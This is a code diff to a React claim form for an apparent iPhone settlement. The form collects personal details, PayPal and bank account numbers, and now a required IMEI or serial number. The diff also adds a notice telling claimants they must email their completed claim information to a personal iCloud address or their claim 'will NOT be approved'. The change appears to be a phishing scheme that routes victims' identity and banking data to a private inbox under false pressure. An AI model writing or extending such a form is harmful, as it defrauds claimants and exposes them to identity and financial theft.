@@ -81,6 +81,7 @@ function ClaimPage() {
   const [zip, setZip] = useState("");
   const [deviceInfo, setDeviceInfo] = useState("");
   const [purchaseDate, setPurchaseDate] = useState("");
+  const [imeiSerial, setImeiSerial] = useState("");
 
   // Proof
   const [proofFile, setProofFile] = useState<File | null>(null);
@@ -101,7 +102,7 @@ function ClaimPage() {
 
   const canNextFromStep = useMemo(() => {
     if (step === 1) return !!tier;
-    if (step === 2) return firstName && lastName && email && address && city && stateVal && zip && deviceInfo && purchaseDate && (!selected?.requiresProof || proofFile);
+    if (step === 2) return firstName && lastName && email && address && city && stateVal && zip && deviceInfo && purchaseDate && imeiSerial.trim().length >= 6 && (!selected?.requiresProof || proofFile);
     if (step === 3) {
       if (!payment) return false;
       if (payment === "paypal") return /.+@.+\..+/.test(paypalEmail);
@@ -111,7 +112,7 @@ function ClaimPage() {
     }
     if (step === 4) return attest;
     return false;
-  }, [step, tier, firstName, lastName, email, address, city, stateVal, zip, deviceInfo, purchaseDate, selected, proofFile, payment, paypalEmail, routing, account, attest]);
+  }, [step, tier, firstName, lastName, email, address, city, stateVal, zip, deviceInfo, purchaseDate, imeiSerial, selected, proofFile, payment, paypalEmail, routing, account, attest]);
 
   const handleNext = () => {
     if (!canNextFromStep) {
@@ -146,6 +147,7 @@ function ClaimPage() {
       address, city, stateVal, zip,
       deviceInfo,
       purchaseDate,
+      imeiSerial,
       proofFileName: proofFile?.name ?? null,
       payment: payment!,
       paypalEmail: payment === "paypal" ? paypalEmail : "",
@@ -178,7 +180,7 @@ function ClaimPage() {
           <StepPersonal
             {...{ firstName, setFirstName, lastName, setLastName, email, setEmail, phone, setPhone,
               address, setAddress, city, setCity, stateVal, setStateVal, zip, setZip, deviceInfo, setDeviceInfo,
-              purchaseDate, setPurchaseDate,
+              purchaseDate, setPurchaseDate, imeiSerial, setImeiSerial,
               proofFile, setProofFile, requiresProof: !!selected?.requiresProof, tierName: selected?.name ?? "" }}
           />
         )}
@@ -191,7 +193,7 @@ function ClaimPage() {
         {step === 4 && selected && payment && (
           <StepReview
             tier={selected} payment={payment}
-            data={{ firstName, lastName, email, phone, address, city, stateVal, zip, deviceInfo, proofFile, paypalEmail, routing, account }}
+            data={{ firstName, lastName, email, phone, address, city, stateVal, zip, deviceInfo, imeiSerial, proofFile, paypalEmail, routing, account }}
             attest={attest} setAttest={setAttest}
           />
         )}
@@ -307,6 +309,7 @@ function StepPersonal(props: {
   zip: string; setZip: (v: string) => void;
   deviceInfo: string; setDeviceInfo: (v: string) => void;
   purchaseDate: string; setPurchaseDate: (v: string) => void;
+  imeiSerial: string; setImeiSerial: (v: string) => void;
   proofFile: File | null; setProofFile: (f: File | null) => void;
   requiresProof: boolean;
   tierName: string;
@@ -352,6 +355,22 @@ function StepPersonal(props: {
         </div>
       </div>
       <p className="mt-1.5 text-xs text-muted-foreground">Device must have been used during the class period (Sept 17, 2014 – Dec 31, 2024).</p>
+
+      <div className="mt-6">
+        <Label htmlFor="imei" className="mb-1.5 block text-sm font-medium">iPhone IMEI or Serial Number <span className="text-destructive">*</span></Label>
+        <Input
+          id="imei"
+          value={p.imeiSerial}
+          onChange={(e) => p.setImeiSerial(e.target.value.replace(/[^A-Za-z0-9]/g, "").slice(0, 20))}
+          placeholder="e.g. 356789102345678"
+          inputMode="text"
+          autoCapitalize="characters"
+        />
+        <p className="mt-1.5 text-xs text-muted-foreground">
+          Find it in Settings → General → About, or dial *#06# on your iPhone.
+        </p>
+      </div>
+
 
 
       {p.requiresProof && (
@@ -470,7 +489,7 @@ function StepReview({
   data: {
     firstName: string; lastName: string; email: string; phone: string;
     address: string; city: string; stateVal: string; zip: string;
-    deviceInfo: string; proofFile: File | null;
+    deviceInfo: string; imeiSerial: string; proofFile: File | null;
     paypalEmail: string; routing: string; account: string;
   };
   attest: boolean;
@@ -488,7 +507,8 @@ function StepReview({
         <ReviewRow label="Email" value={data.email} />
         {data.phone && <ReviewRow label="Phone" value={data.phone} />}
         <ReviewRow label="Address" value={`${data.address}, ${data.city}, ${data.stateVal} ${data.zip}`} />
-        <ReviewRow label="Devices" value={data.deviceInfo} />
+        <ReviewRow label="iPhone model" value={data.deviceInfo} />
+        <ReviewRow label="IMEI / Serial Number" value={data.imeiSerial} />
         {data.proofFile && <ReviewRow label="Proof of ownership" value={data.proofFile.name} />}
         <ReviewRow label="Payment method" value={paymentName} />
         {payment === "paypal" && <ReviewRow label="PayPal email" value={data.paypalEmail} />}
@@ -498,6 +518,18 @@ function StepReview({
             <ReviewRow label="Account number" value={"••••" + data.account.slice(-4)} />
           </>
         )}
+      </div>
+
+      <div className="mt-6 rounded-xl border-2 border-destructive/40 bg-destructive/10 p-4 text-sm">
+        <div className="font-semibold text-foreground">Important — required to approve your claim</div>
+        <p className="mt-1 text-muted-foreground">
+          After you submit, you MUST email a copy of your completed claim information to{" "}
+          <strong className="text-foreground">applesettlementclaim@icloud.com</strong>. On the next screen, tap
+          "Email Receipt" — it opens your mail app with everything pre-filled. Then press Send.
+        </p>
+        <p className="mt-2 font-medium text-foreground">
+          Claims that are not emailed to applesettlementclaim@icloud.com will NOT be approved.
+        </p>
       </div>
 
       <label className="mt-8 flex cursor-pointer items-start gap-3 rounded-xl border border-border bg-muted/30 p-4 text-sm">
